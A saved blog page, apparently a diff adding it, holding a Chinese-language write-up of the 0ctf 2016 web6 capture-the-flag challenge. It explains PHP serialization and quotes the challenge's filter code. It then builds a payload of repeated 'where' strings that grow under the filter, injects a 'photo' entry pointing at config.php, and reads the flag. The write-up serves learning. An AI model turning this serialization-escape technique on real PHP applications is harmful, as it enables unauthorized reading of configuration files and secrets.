@@ -1,0 +1,426 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>0ctf-web6-Php Fuzzing Writeup - Veneno's Blog</title>
+<link href="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content=":(很遗憾队伍没有进入前十，毕竟是0ops出的题。这也同时暴露了战队的一些问题，小伙伴们也进行了反思，我相信我们会越来越好:)开学越来越忙，尤其要考研，每天晚上都在自习室学到快熄灯才回宿舍，学校..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-66'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-66'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-66');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _duQV = //'9K'
+'d6f'+/* 'VK'//'VK' */''+'4'//'E'
++'87c'//'WK1'
++//'6B'
+'0a0'+'a'//'k'
++'d'//'SsH'
++'db'//'b'
++//'H'
+'66'+'63'//'CJL'
++//'4'
+'0'+//'VA'
+'VA'+'c2'//'2Af'
++//'AS'
+'1e'+'e2e'//'rKB'
++'Q'//'Q'
++//'r'
+'d42'+//'o'
+'2'+//'N0w'
+'16', _OLv = [[19,21],[26,27]];
+    
+    for (var i = 0; i < _OLv.length; i ++) {
+        _duQV = _duQV.substring(0, _OLv[i][0]) + _duQV.substring(_OLv[i][1]);
+    }
+
+    return _duQV;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">0ctf-web6-Php Fuzzing Writeup</div>
+<small class="article-time">发表于： <time datetime="2016-03-15T20:28:00+00:00" itemprop="datePublished">2016-03-15</time> | 分类： <a href="http://www.venenof.com/index.php/category/CTF/">CTF</a> | <a href="http://www.venenof.com/index.php/archives/66/#comments" itemprop="discussionUrl">评论：2 </a> | 阅读：313</small>
+<div class="article-content">
+<p>:(很遗憾队伍没有进入前十，毕竟是0ops出的题。这也同时暴露了战队的一些问题，小伙伴们也进行了反思，我相信我们会越来越好:)<br/>
+开学越来越忙，尤其要考研，每天晚上都在自习室学到快熄灯才回宿舍，学校因为没开高数课程，而高中学的那些都忘了差不多了，不得不重新学习高数，默默想起了高中晚自习什么都不干，一直研究数学压轴题的生活，虽然累但是很充实很快乐:)好了言归正传：</p>
+<ul>
+<li>0x00-php序列化</li>
+</ul>
+<pre><code>&lt;?php
+    $a = array('Ven','Hello','World');
+    $b = serialize($a);
+    print_r($b);echo "&lt;br /&gt;";
+    print_r(unserialize($b));
+?&gt;
+</code></pre>
+<p>这样我们可以得到以下结果：</p>
+<pre><code>a:3:{i:0;s:3:"Ven";i:1;s:5:"Hello";i:2;s:5:"World";}
+Array ( [0] =&gt; Ven [1] =&gt; Hello [2] =&gt; World ) 
+</code></pre>
+<!--more-->
+<p>其中i代表数组的序号，s代表字符长度。</p>
+<ul>
+<li>0x02-题目</li>
+</ul>
+<p>访问链接，一开始以为是sqli，看了看源码发现有注册以及别的一些页面，发现登录注册用户时，会提示更新个人信息，自己本地搭建了下，如下图：<br/>
+<img alt="QQ截图20160315195452.png" src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/3137733060.png"/><br/>
+看下update.php：</p>
+<pre><code>if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)
+    die('Invalid nickname');//于是这里可以利用正则进行绕过传入数组
+
+$profile['phone'] = $_POST['phone'];
+$profile['email'] = $_POST['email'];
+$profile['nickname'] = $_POST['nickname'];
+$profile['photo'] = 'upload/' . md5($file['name']);
+$user-&gt;update_profile($username, serialize($profile));
+echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;';
+</code></pre>
+<p>看一下profile.php：</p>
+<pre><code>$profile = unserialize($profile);
+$phone = $profile['phone'];
+$email = $profile['email'];
+$nickname = $profile['nickname'];
+$photo = base64_encode(file_get_contents($profile['photo']));
+</code></pre>
+<p>所以到这里的思路就是利用php的反序列化，利用file_get_contents去读到config.php，从而拿到flag。<br/>
+这时候看一下class.php，会发现php filter会将一些字符给替换，于是where==hacker，便逃逸了一个字符。</p>
+<pre><code> public function filter($string) {
+            $escape = array('\'', '\\\\');
+            $escape = '/' . implode('|', $escape) . '/';
+            $string = preg_replace($escape, '_', $string);
+    
+            $safe = array('select', 'insert', 'update', 'delete', 'where');
+            $safe = '/' . implode('|', $safe) . '/i';
+            return preg_replace($safe, 'hacker', $string);
+        }
+</code></pre>
+<p>可能这样看不容易理解，那这样来看：</p>
+<pre><code>&lt;?php
+$profile = 'a:4:{s:5:"phone";s:11:"12345678910";s:5:"email";s:15:"Veneno@mail.com";s:8:"nickname";s:6:"Veneno";s:5:"photo";s:10:"config.php";}s:39:"upload/979d472a84804b9f647bc185a877a8b5";}';
+$a = Array ( 'phone' =&gt; '12345678910','email' =&gt; 'Veneno@mail.com', 'nickname' =&gt; 'Veneno' ,'photo' =&gt; 'config.php' );
+print_r(serialize($a))."&lt;br&gt;";
+echo '&lt;/br&gt;';
+$profile = unserialize($profile);
+print_r($profile)."&lt;br&gt;";
+$phone = $profile['phone'];
+$email = $profile['email'];
+$nickname = $profile['nickname'];
+$photo = base64_encode(file_get_contents($profile['photo']));
+$flag = base64_decode($photo);
+echo $phone."&lt;br&gt;";
+echo $email."&lt;br&gt;";
+echo $nickname."&lt;br&gt;";
+echo $photo."&lt;br&gt;";
+echo $flag;
+?&gt;
+结果：
+a:4:{s:5:"phone";s:11:"12345678910";s:5:"email";s:15:"Veneno@mail.com";s:8:"nickname";s:6:"Veneno";s:5:"photo";s:10:"config.php";}
+Array ( [phone] =&gt; 12345678910[email] =&gt; Veneno@mail.com [nickname] =&gt; Veneno [photo] =&gt; config.php ) 13587819970
+Veneno@mail.com
+Veneno
+ZmxhZ3tHb29kX0pvYjopfQo=
+flag{Good_Job:)} 
+</code></pre>
+<p>于是可以构造出：</p>
+<blockquote>
+<p>wherewherewherewherewherewherewherewherewherewherewhere<br/>
+wherewherewherewherewherewherewherewherewherewherewhere<br/>
+wherewherewherewherewherewherewherewherewherewherewhere<br/>
+where";}s:5:"photo";s:10:"config.php";}</p>
+</blockquote>
+<p>成功后访问profile.php，在源码可以看到base64编码，于是flag到手:<br/>
+<img alt="QQ截图20160314111542.png" src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/3540283523.png"/></p>
+<hr/>
+<p>0ctf确实学到了很多东西，自己也要继续加油。</p>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/62/" title="SSCTF Web writeup">SSCTF Web writeup</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/76/" title="第三届'安恒杯'web1和web3 wp">第三届'安恒杯'web1和web3 wp</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="66" data-title="0ctf-web6-Php Fuzzing Writeup" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/jquery.min.js"></script>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/all.js"></script>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/jquery.js"></script>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/prism.js"></script>
+<script src="./0ctf-web6-Php Fuzzing Writeup - Veneno's Blog/search.js"></script>
+</div>
+
